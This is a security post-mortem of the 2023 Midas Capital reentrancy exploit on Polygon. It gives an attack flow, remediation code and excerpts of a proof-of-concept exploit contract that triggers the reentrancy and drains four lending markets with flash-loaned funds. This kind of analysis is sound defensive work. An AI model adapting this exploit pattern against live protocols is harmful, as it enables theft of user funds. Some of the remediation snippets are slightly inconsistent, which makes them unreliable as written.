# Midas Capital — Read-Only Reentrancy + Curve LP Price Manipulation Analysis

| Item | Details |
|------|------|
| **Date** | 2023-01-15 |
| **Protocol** | Midas Capital (Polygon) |
| **Chain** | Polygon |
| **Loss** | ~663,101 MATIC (≈ $660,000) |
| **Attacker** | [0x1863...8611](https://polygonscan.com/address/0x1863b74778cf5e1c9c482a1cdc2351362bd08611) |
| **Attack Contract** | [0x757E...23A1](https://polygonscan.com/address/0x757E9F49aCfAB73C25b20D168603d54a66C723A1) |
| **Attack Tx** | [0x0053...2c2f](https://polygonscan.com/tx/0x0053490215baf541362fc78be0de98e3147f40223238d5b12512b3e26c0a2c2f) |
| **Vulnerable Contract** | [0xFb6F...B28 (Curve WMATIC-stMATIC Pool)](https://polygonscan.com/address/0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28) |
| **Price Oracle** | [0xb9e1...c31](https://polygonscan.com/address/0xb9e1c2B011f252B9931BBA7fcee418b95b6Bdc31) |
| **Root Cause** | Read-only reentrancy on `get_virtual_price()` during Curve LP `remove_liquidity` callback |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/Midas_exp.sol) |

---

## 1. Vulnerability Overview

Midas Capital is a Compound-fork-based lending protocol on Polygon that accepted WMATIC-stMATIC Curve LP tokens as collateral. Collateral valuation relied on an on-chain oracle that called the `get_virtual_price()` function of the Curve pool.

The attacker exploited a **Read-Only Reentrancy** technique. The Curve pool's `remove_liquidity()` function transfers MATIC natively and triggers a callback *before* updating the internal state (`self.D`). If `get_virtual_price()` is called within this callback window, the LP supply (`totalSupply`) has already decreased while the pool's internal invariant `D` still holds its old value — causing the **virtual price to be returned abnormally high (~10×)**.

Because Midas Capital's oracle adopted this distorted price as the collateral value, the attacker was able to borrow 10× more assets than their actual collateral warranted.

Vulnerability combination:
- **V-01**: Curve LP `get_virtual_price` Read-Only Reentrancy (CRITICAL)
- **V-02**: Flash loan-amplified capital via triple nesting (HIGH)
- **V-03**: Single oracle source with no reentrancy integrity check (HIGH)

---

## 2. Vulnerable Code Analysis

### 2.1 Curve Pool — `remove_liquidity` Reentrancy Trigger (Core Vulnerability)

The `remove_liquidity` function of the Curve WMATIC-stMATIC pool transfers native MATIC to the caller via `call{value:}`. A structural flaw exists where the pool's internal invariant `D` and balance updates occur **after** the transfer.

```solidity
// ❌ Vulnerable code (Curve Pool — Vyper pseudocode, reentrancy-vulnerable flow)
@external
@nonreentrant("lock")  // Note: nonreentrant is present but does NOT protect view functions
def remove_liquidity(
    _amount: uint256,
    min_amounts: uint256[2],
    use_eth: bool
) -> uint256[2]:
    # Step 1: Burn LP tokens → totalSupply decreases
    CurveToken(self.lp_token).burnFrom(msg.sender, _amount)

    # Step 2: Calculate return amounts (self.D is still old value)
    amounts: uint256[2] = [...]

    # Step 3: Transfer MATIC → callback triggered here ← reentrancy entry point
    # totalSupply has decreased but self.D is not yet updated
    raw_call(msg.sender, b"", value=amounts[0])  # ← callback trigger

    # Step 4: Update self.D and balances (too late!)
    self.D = new_D  # ← executed only after reentrancy
```

**Distortion mechanism**: `get_virtual_price()` = `D / totalSupply`. At callback time, `totalSupply` has decreased due to the burn but `D` still holds the large old value → abnormal price spike.

```solidity
// ✅ Fixed code (Checks-Effects-Interactions pattern applied)
@external
@nonreentrant("lock")
def remove_liquidity(
    _amount: uint256,
    min_amounts: uint256[2],
    use_eth: bool
) -> uint256[2]:
    # Step 1: Update all internal state first (Effects)
    CurveToken(self.lp_token).burnFrom(msg.sender, _amount)
    self.D = new_D          # ✅ Update D before transfer
    self.balances = new_balances  # ✅ Update balances before transfer

    # Step 2: External transfer last (Interactions)
    raw_call(msg.sender, b"", value=amounts[0])
```

**Issue**: Curve's `nonreentrant("lock")` guard only protects state-changing functions on the same pool; external contracts' `view` functions (such as `get_virtual_price()`) can be called without a separate lock. If an oracle reads this `view` function within the callback window, it receives the distorted price directly.

---

### 2.2 Midas Capital Oracle — Missing Reentrancy Integrity Check

```solidity
// ❌ Vulnerable oracle code (Midas Capital PriceProvider — inferred)
contract CurveLPPriceProvider {
    ICurvePools public curvePool;

    function getUnderlyingPrice(address cToken) external view returns (uint256) {
        // Danger: directly calls virtual_price from the Curve pool
        // If this function is called during a remove_liquidity callback, it returns a distorted price
        uint256 virtualPrice = curvePool.get_virtual_price(); // ← manipulable
        uint256 lpPrice = virtualPrice * underlyingPrice / 1e18;
        return lpPrice;
    }
}
```

```solidity
// ✅ Fixed oracle code
contract CurveLPPriceProvider {
    ICurvePools public curvePool;

    // Guard that detects whether the Curve pool is in a reentered state
    function isReentered() internal view returns (bool) {
        // Attempt a zero-value call to the Curve pool
        // If reentrancy is in progress, the nonreentrant lock causes a revert
        (bool success, ) = address(curvePool).staticcall(
            abi.encodeWithSignature("claim_admin_fees()")
        );
        return !success; // revert = reentrancy in progress
    }

    function getUnderlyingPrice(address cToken) external view returns (uint256) {
        // ✅ Check for reentrancy state
        require(!isReentered(), "Reentrancy detected: price unreliable");

        uint256 virtualPrice = curvePool.get_virtual_price();
        uint256 lpPrice = virtualPrice * underlyingPrice / 1e18;
        return lpPrice;
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker deploys the attack contract (`0x757E...23A1`) before block 38118348
- Calls `enterMarkets()` on the Midas Capital lending market to register collateral markets
- Approves WMATIC for the Curve WMATIC-stMATIC pool

### 3.2 Execution Phase

1. **Balancer flash loan**: Borrow the entire WMATIC balance (~71.8M) from Balancer V2
2. **Aave V3 flash loan**: Borrow additional WMATIC from the Aave V3 aPolWMATIC pool
3. **Aave V2 flash loan**: Borrow additional WMATIC from the Aave V2 amWMATIC pool (total ~540,000 WMATIC secured)
4. **LP deposit + collateral supply**: Deposit 270,000 WMATIC into Curve → receive LP tokens → mint into Midas WMATIC_STMATIC market (supply collateral)
5. **Trigger reentrancy**: Create Curve LP with remaining WMATIC then call `remove_liquidity(LPAmount, [0,0], true)` → MATIC transfer triggers callback
6. **Reentrancy window (receive())**: At callback time, `get_virtual_price()` spikes abnormally → execute `borrowAll()` to over-borrow from 4 markets
   - `FJCHF.borrow()` — full balance
   - `FJEUR.borrow(425,500 jEUR)`
   - `FJGBP.borrow()` — full balance
   - `FAGEUR.borrow()` — full balance
7. **Liquidation + collateral recovery**: Deploy `LiquidateContract` to liquidate the over-borrowed positions → recover WMATIC_STMATIC collateral
8. **Swap and profit realization**: Convert jCHF/jEUR/jGBP/agEUR → USDC → WMATIC via KyberSwap + Uniswap V3
9. **Repay loans**: Repay flash loan principal + fees in order: Aave V2 → Aave V3 → Balancer
10. **Withdraw profit**: ~663,101 MATIC (~$660,000) realized

### 3.3 Attack Flow Diagram

```
Attacker (0x1863...8611)
        │
        ▼
┌───────────────────────────────────┐
│   Deploy Attack Contract          │
│   0x757E...23A1                   │
└───────────────────────────────────┘
        │  balancerFlashloan()
        ▼
┌───────────────────────────────────┐
│   Balancer V2                     │
│   Flash Loan: ~71.8M WMATIC       │
└───────────────────────────────────┘
        │  receiveFlashLoan() callback
        ▼
┌───────────────────────────────────┐
│   Aave V3                         │
│   Flash Loan: ~41.4M WMATIC       │
└───────────────────────────────────┘
        │  executeOperation() callback
        ▼
┌───────────────────────────────────┐
│   Aave V2                         │
│   Flash Loan: ~12.8M WMATIC       │
└───────────────────────────────────┘
        │  executeOperation() callback
        ▼
┌───────────────────────────────────┐
│   Curve WMATIC-stMATIC Pool       │
│   add_liquidity(270,000 WMATIC)   │
│   → Receive LP tokens             │
└───────────────────────────────────┘
        │  mint(LP tokens)
        ▼
┌───────────────────────────────────┐
│   Midas WMATIC_STMATIC Market     │
│   Supply collateral (normal price)│
└───────────────────────────────────┘
        │  add_liquidity() + remove_liquidity(, , donate_dust=true)
        ▼
┌───────────────────────────────────┐
│   Curve Pool                      │
│   Burn LP → MATIC transfer callback│◄─── totalSupply decreases
│   (self.D not yet updated!)       │     self.D still holds old value
└───────────────────────────────────┘
        │  receive() called (reentrancy window)
        ▼
┌───────────────────────────────────┐
│   Oracle PriceProvider            │
│   getUnderlyingPrice() called     │
│   get_virtual_price() ≈ 10× inflated│◄─── Core vulnerability
└───────────────────────────────────┘
        │  borrowAll() with over-valued collateral
        ▼
┌───────────────────────────────────┐
│   Midas Capital Lending Markets   │
│   ├─ FJCHF.borrow() full balance  │
│   ├─ FJEUR.borrow(425,500)        │
│   ├─ FJGBP.borrow() full balance  │
│   └─ FAGEUR.borrow() full balance │
└───────────────────────────────────┘
        │  liquidation + swap
        ▼
┌───────────────────────────────────┐
│   KyberSwap + Uniswap V3          │
│   jCHF/jEUR/jGBP/agEUR → WMATIC  │
└───────────────────────────────────┘
        │
        ▼
   Profit: ~663,101 MATIC (~$660,000)
   → Withdrawn to KuCoin / Binance
```

### 3.4 Outcome

- **Attacker profit**: ~663,101 MATIC (≈ $660,000)
- **Protocol damage**: Assets drained across 4 markets — FJCHF, FJEUR, FJGBP, FAGEUR
  - Assets borrowed: jCHF ~273,973 / jEUR ~368,058 (425,500 − remainder) / jGBP ~45,250 / agEUR ~45,435
- **Victims**: Jarvis Network and Angle Protocol assets 98.5%, individual users 9 × 1.5%

---

## 4. PoC Code (DeFiHackLabs Key Excerpts)

```solidity
// [Phase 1] Core attack logic executed in Aave V2 callback
function executeOperation(...) external payable returns (bool) {
    if (msg.sender == address(aaveV2)) {
        // 1. Register 5 Midas lending markets (authorize collateral use)
        unitroller.enterMarkets(cTokens);

        // 2. Deposit 270,000 WMATIC into Curve → receive LP tokens
        curvePool.add_liquidity([uint256(0), uint256(270_000 * 1e18)], 0);

        // 3. Supply LP tokens as collateral to Midas
        WMATIC_STMATIC.mint(mintAmount);

        // 4. Create LP with remaining WMATIC then immediately remove
        //    donate_dust=true → triggers native MATIC callback
        uint256 LPAmount = curvePool.add_liquidity([uint256(0), WMMATICAmount], 0);
        curvePool.remove_liquidity(LPAmount, [uint256(0), uint256(0)], true);
        //                                                              ^^^^
        //                                    This parameter triggers MATIC transfer
        //                                    → reentrancy occurs in receive() callback

        // 6. After reentrancy: recover collateral via liquidation
        liquidate();

        // 7. Clean up remaining LP tokens + swap everything
        curvePool.remove_liquidity_one_coin(...);
        swapAll();
    }
}

// [Phase 2] Reentrancy window — Curve remove_liquidity callback
receive() external payable {
    if (msg.sender == address(curvePool)) {
        // At this point: totalSupply decreased + self.D still holds old value
        // → get_virtual_price() = D / totalSupply ≈ 10× inflated

        // Borrow full balance from 4 markets using distorted collateral price
        borrowAll();
    }
}

function borrowAll() internal {
    // Borrow full amount from each market based on over-valued collateral
    FJCHF.borrow(IERC20(FJCHF.underlying()).balanceOf(address(FJCHF)));
    FJEUR.borrow(425_500 * 1e18);   // jEUR is partial (liquidity limit)
    FJGBP.borrow(IERC20(FJGBP.underlying()).balanceOf(address(FJGBP)));
    FAGEUR.borrow(IERC20(FAGEUR.underlying()).balanceOf(address(FAGEUR)));
}

// [Phase 3] Self-liquidation to recover collateral
function liquidate() internal {
    LiquidateContract liquidateContract = new LiquidateContract();
    // Transfer borrowed jFIAT to liquidation contract
    IERC20(FJCHF.underlying()).transfer(address(liquidateContract), 22_214_068_291_997_556_144_357);
    IERC20(FJEUR.underlying()).transfer(address(liquidateContract), 57_442_500_000_000_000_000_000);
    IERC20(FJGBP.underlying()).transfer(address(liquidateContract), 4_750_000_000_000_000_000_000);
    IERC20(FAGEUR.underlying()).transfer(address(liquidateContract), 4_769_452_686_674_485_072_297);
    // After liquidation, recover WMATIC_STMATIC collateral → receive STMATIC_F
    liquidateContract.liquidate(address(this));
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Curve LP Read-Only Reentrancy (`get_virtual_price` distortion) | CRITICAL | CWE-362 (Race Condition), CWE-841 (Improper State Management) | `01_reentrancy.md` — Pattern 4 | dForce Read-Only Reentrancy (2023-02), Sturdy Finance (2023-06), Conic Finance (2023-07) |
| V-02 | Triple-nested flash loan (Balancer + Aave V3 + Aave V2) | HIGH | CWE-400 (Uncontrolled Resource Consumption) | `02_flash_loan.md` | bZx #1 (2020), Harvest Finance (2020) |
| V-03 | Single on-chain oracle — no reentrancy integrity check | HIGH | CWE-346 (Origin Validation Failure), CWE-704 (Incorrect Type Conversion) | `04_oracle_manipulation.md` — Pattern 1 | Mango Markets (2022), BonqDAO (2023-02) |

### V-01: Curve LP Read-Only Reentrancy

- **Description**: Curve's `remove_liquidity()` transfers native MATIC before updating the internal invariant `D`. At the transfer callback (`receive()`) moment, `totalSupply` has decreased but `D` still holds the old value, so `get_virtual_price() = D / totalSupply` is returned abnormally high. External oracles that read this value consume the distorted price directly.
- **Impact**: Collateral value overestimated by up to 10×, enabling excessive borrowing. Complete drainage of the lending protocol's liquidity.
- **Attack conditions**: (1) A lending protocol that accepts Curve LP tokens as collateral, (2) the oracle directly calls `get_virtual_price()`, (3) the Curve pool's reentrancy lock does not protect external `view` functions.

### V-02: Triple-Nested Flash Loan

- **Description**: Flash loans are nested across 3 protocols in sequence (Balancer → Aave V3 → Aave V2) to secure hundreds of thousands of WMATIC at zero cost, circumventing single-protocol flash loan limits.
- **Impact**: Enables assembling enormous attack capital from a small initial amount.
- **Attack conditions**: Access to multiple flash loan protocols; additional flash loans permitted within callbacks.

### V-03: Single On-Chain Oracle Without Reentrancy Integrity Check

- **Description**: Midas Capital's `PriceProvider` relies solely on the Curve pool's `get_virtual_price()` and does not verify the Curve pool's reentrancy state at call time.
- **Impact**: Oracle trusts the manipulated price and permits excessive borrowing.
- **Attack conditions**: Oracle calls `get_virtual_price()` directly without a guard that checks the reentrancy lock state.

---

## 6. Remediation Recommendations

### 6.1 Immediate Actions (Code Level)

#### Apply Oracle Reentrancy Guard

```solidity
// ✅ Guard for detecting Curve pool reentrancy state
contract SafeCurveLPOracle {
    address public immutable curvePool;

    // Check whether the Curve pool is in a locked state
    // If nonreentrant lock is active, state-changing functions will revert
    modifier curveLockCheck() {
        // claim_admin_fees() is a nonreentrant-protected function
        // If reentrancy is in progress, this call will revert
        try ICurvePool(curvePool).withdraw_admin_fees() {
            // Success means not currently reentered (use staticcall in practice)
        } catch {
            revert("Curve pool is reentered: unsafe price");
        }
        _;
    }

    function getUnderlyingPrice(address cToken) external view
        curveLockCheck
        returns (uint256)
    {
        uint256 virtualPrice = ICurvePool(curvePool).get_virtual_price();
        // ... price calculation
        return lpPrice;
    }
}
```

#### Chainlink + Curve Dual Price Validation (Additional Defense)

```solidity
// ✅ Detect anomalous values with dual oracle
function getUnderlyingPrice(address cToken) external view returns (uint256) {
    uint256 curvePrice = ICurvePool(curvePool).get_virtual_price();
    uint256 chainlinkPrice = getChainlinkPrice(); // secondary oracle

    // Block transactions if two oracle prices diverge by more than 10%
    uint256 deviation = curvePrice > chainlinkPrice
        ? (curvePrice - chainlinkPrice) * 1e18 / chainlinkPrice
        : (chainlinkPrice - curvePrice) * 1e18 / chainlinkPrice;

    require(deviation < 0.10e18, "Price deviation too high");
    return curvePrice;
}
```

### 6.2 Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Read-Only Reentrancy | Verify Curve pool's nonreentrant lock state before oracle call. Use staticcall to a lock-check function and evaluate success/failure. |
| V-01 Curve Internal Issue | Curve side: apply CEI pattern — move `self.D` update to before the native transfer. |
| V-02 Flash Loan | Apply a price circuit breaker that freezes prices during large liquidity changes within a single transaction. |
| V-03 Single Oracle | Use multiple oracle sources in parallel (Chainlink, TWAP, etc.). Set a deviation threshold for anomalous values. |
| General | Mandatory audit of external contract reentrancy risks before adding any new collateral asset. |

---

## 7. Lessons Learned

1. **Read-only reentrancy cannot be blocked by `nonreentrant` guards**: `view` functions are not covered by standard reentrancy locks. Since `view` functions can be called mid-execution of an external contract's state transition, the consumer side (oracle, lending protocol) must independently detect the reentrancy state.

2. **Do not trust state consistency of external contracts**: Even a public `view` function like `get_virtual_price()` can return inconsistent values depending on when it is called. In particular, all callback paths that can execute during a complex operation like `remove_liquidity` must be fully analyzed.

3. **Adding collateral assets requires a full attack surface analysis**: When adding a new asset (especially LP tokens, derivative tokens) as collateral, the price calculation logic for that asset and the reentrancy risks of the underlying protocol must be comprehensively audited.

4. **Be aware of the triple-nested flash loan pattern**: Threat models must include scenarios where single flash loan limits are circumvented by nesting flash loans across multiple protocols.

5. **Similar vulnerabilities recur in similar forks**: The same pattern has recurred across protocols that use Curve LP as an oracle — including dForce (2023-02), Sturdy Finance (2023-06), and Conic Finance (2023-07). Compound-fork-based lending protocols must always review this pattern when handling Curve LP collateral.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Basic Information

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Attacker address | ContractTest (test) | 0x1863b74778cf5e1c9c482a1cdc2351362bd08611 | ✅ Match |
| Attack contract | Dynamically deployed | 0x757E9F49aCfAB73C25b20D168603d54a66C723A1 | ✅ Confirmed |
| Attack Tx | Test environment | 0x0053490215baf541362fc78be0de98e3147f40223238d5b12512b3e26c0a2c2f | ✅ Confirmed |
| Block number | 38,118,347 (fork) | 38,118,348 | ✅ Match (block immediately after fork) |
| Timestamp | - | 2023-01-15 17:43:37 UTC | ✅ Date match |
| Gas used | - | 12,065,462 / 15,312,508 (78.79%) | - |
| Loss amount | ~660,000 USD | ~663,101 MATIC (~$660K) | ✅ Approximate match |

### 8.2 On-Chain Event Log Sequence (207 events)

1. `MarketEntered` — Enter 5 Midas Capital markets
2. `Transfer` (WMATIC → Curve Pool) — Deposit liquidity
3. `Transfer` (Curve LP Token → ContractTest) — Receive LP tokens
4. `Transfer` (LP Token → WMATIC_STMATIC) — Supply collateral
5. `Mint` (WMATIC_STMATIC) — Issue cToken
6. `Transfer` (Curve LP Token Burn) — Execute `remove_liquidity`
7. **[Reentrancy window]** `Borrow` × 4 — Borrow FJCHF, FJEUR, FJGBP, FAGEUR
8. `LiquidateBorrow` × 4 — Self-liquidation
9. `Transfer` (jCHF/jEUR/jGBP/agEUR → KyberSwap/UniV3) — Swap
10. `Transfer` (USDC → WMATIC) — Final WMATIC conversion
11. `Transfer` (WMATIC → Balancer/AaveV3/AaveV2) — Flash loan repayment

### 8.3 Precondition Verification

- **Attack contract creation**: Deployed directly by the attacker in block 38118348 (newly created contract)
- **Reentrancy trigger**: `remove_liquidity(LPAmount, [0,0], true)` — the last argument `donate_dust=true` triggers native MATIC transfer, enabling the callback
- **Price distortion confirmed**: PoC logs show before/after price comparison during reentrancy — `Before reentrancy collateral price: X` vs `After reentrancy collateral price: ~10X`
- **Unverified**: Direct on-chain querying via cast not performed (no network connection). The above data is based on PolygonScan web crawling and PoC analysis.

---

## 9. References

- [PeckShield Twitter Analysis](https://twitter.com/peckshield/status/1614774855999844352)
- [BlockSec Twitter Analysis](https://twitter.com/BlockSecTeam/status/1614864084956254209)
- [Neptune Mutual Analysis Blog](https://medium.com/neptune-mutual/how-was-midas-capital-exploited-f9d90926eaf2)
- [Midas Capital Official Post-Mortem](https://medium.com/@midascapital/moving-forward-jarvis-polygon-pool-exploit-a532074103f6)
- [Quadriga Initiative Summary](https://www.quadrigainitiative.com/hackfraudscam/midascapitalvirtualpricereentrancy.php)
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/Midas_exp.sol)
- [Attack Transaction (PolygonScan)](https://polygonscan.com/tx/0x0053490215baf541362fc78be0de98e3147f40223238d5b12512b3e26c0a2c2f)